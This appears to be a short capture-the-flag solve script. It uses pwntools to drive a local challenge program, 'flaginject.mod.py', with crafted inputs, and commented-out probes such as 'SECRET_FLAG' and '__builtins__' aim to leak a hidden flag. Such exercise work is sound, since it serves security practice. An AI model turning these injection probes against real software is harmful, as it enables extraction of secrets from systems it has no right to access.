from pwn import *

io = process(["python", "flaginject.mod.py"])


io.sendlineafter(b":", b"0")
io.sendlineafter(b":", b"5")
io.sendlineafter(b":", b"_" * 100)
io.sendlineafter(b":", b"got_flag")
# io.sendlineafter(b":", b"'a' in SECRET_FLAG") # io.sendlineafter(b":", b"__all__")
# io.sendlineafter(b":", b"SECRET_FLAG")
# io.sendlineafter(b":", b"_secret_flag")
# io.sendlineafter(b":", b"__builtins__")
# io.sendlineafter(b":", b"dead_")

io.interactive()
